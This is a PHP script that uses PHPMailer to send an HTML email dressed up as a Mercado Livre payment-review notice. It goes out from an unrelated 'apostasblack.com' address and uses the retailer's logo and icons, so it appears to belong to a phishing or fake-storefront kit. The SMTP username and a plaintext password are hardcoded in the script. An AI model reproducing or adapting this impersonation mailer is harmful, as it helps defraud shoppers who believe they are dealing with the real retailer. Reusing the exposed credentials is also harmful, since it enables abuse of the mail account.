<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;
$email = $_SESSION['user'];
$valor = $_SESSION['totalpreco'];
//Load Composer's autoloader
require '../vendor/autoload.php';

//Create an instance; passing `true` enables exceptions
$mail = new PHPMailer(true);

try {
    //Server settings
    // $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
    $mail->isSMTP();                                            //Send using SMTP
    $mail->Host       = 'smtp.hostinger.com';                     //Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
    $mail->Username   = 'mercadolivre@apostasblack.com';                     //SMTP username
    $mail->Password   = 'Deus102030@@';                               //SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
    $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

    //Recipients
    $mail->setFrom('mercadolivre@apostasblack.com', 'Mercado livre');
    $mail->addAddress($email, $email);     //Add a recipient


    //Attachments
    // $mail->addAttachment('/var/tmp/file.tar.gz');         //Add attachments
    // $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    //Optional name

    //Content
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = "Estamos analisando o seu pagamento";
    $mail->CharSet = 'UTF-8';
    $mail->Body    = "<!DOCTYPE html>
<html>
<head>
	<meta charset='utf-8'>
	<meta http-equiv='X-UA-Compatible' content='IE=edge'>
	<title>Mercado livre</title>
	<style>
		*{
			padding:0px;
			margin:0px;
			font-family: 'Roboto', sans-serif;
			font-weight:300;
		}
		@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300&display=swap');
	</style>
	
</head>
<body>


	<div style='margin:0 auto;width:700px;height:auto;padding:10px;background:rgb(252, 236, 0)'>
		<img border='0' height='40px' src='https://www.mte-thomson.com.br/wp-content/uploads/2021/07/Mercado-Livre-logo-1-1-1024x288.png' alt=''>
	</div>

	<div style='margin:0 auto;width:700px;height:210px;padding:10px;background:rgb(255, 119, 51)'>

		<center><img style='margin-top:20px;' border='0' height='50px'  src='https://ci3.googleusercontent.com/proxy/96vJOVHzfd5_wtlb2S5fE4tTRijWRrpxtP9JC6gETOJ2DVh5MEqRgxKOL0Jyelbsdjp_o2zrnh9pQ5qyKhO5UL8dQrSQZa4gLdQI-I8reOy3-wPSGdEQZ727cmtuHUcnThn_d8VKCsM7IPgcPybC-Sz9zdxsIpY_AsJvxxxM=s0-d-e1-ft#https://http2.mlstatic.com/frontend-assets/buyingflow-frontend-emails/1.25.0/images/status-icon/pending.png' ></center>
		<br>
		<h3 style='text-align: center;color:white;font-weight: bold;'>Estamos analisando o seu pagamento</h3>
	</div>

	<div style='margin:0 auto;width:700px;height:auto;padding:10px;background:rgb(247, 247, 247)'>
		<div style='top:-40px;margin: 0 auto;background:white;width:450px;padding:30px;height:auto;border-radius:6px;z-index: 9000;position: relative;'><br><p>	

Queremos proteger seu dinheiro e nos certificar de que ninguém mais use sua
conta.
<br>
<br>

<div style='margin-top:20px;border-radius:4px;margin-top:20px;padding:20px;width:400px;height:auto;border:solid 1px rgb(201, 201, 201);'>
<span><strong>Detalhe do pedido</strong></span>
<br><br>
	<p><strong><span style='color:rgb(120, 120, 120)'> $tile </span></strong> <br><br>
		<strong><span style='color:rgb(120, 120, 120)'>Frente</span></strong>	<span style='color:rgb(13, 196, 129);'> Grátis</span>
		<br><br>
		<strong><span style='color:rgb(120, 120, 120)'>Valor</span></strong> <span style='color:rgb(13, 196, 129);'>$valor </span>
		<br><br>
		<img border='0' height='100px' src=' $foto ' >
	</p>


	
</div>

</div>
<br><br
<div>
<p style='text-align: center;font-size:12px;'><strong>Mercado Pontos</strong></p>
<p style='text-align: center;font-size:13px;'>Assim que o pagamento for aprovado, você ganhará 199 pontos por esta compra.</p>

	</div>
	
</body>
</html>";
    

    $mail->send();
     
} catch (Exception $e) {
    
}
?> 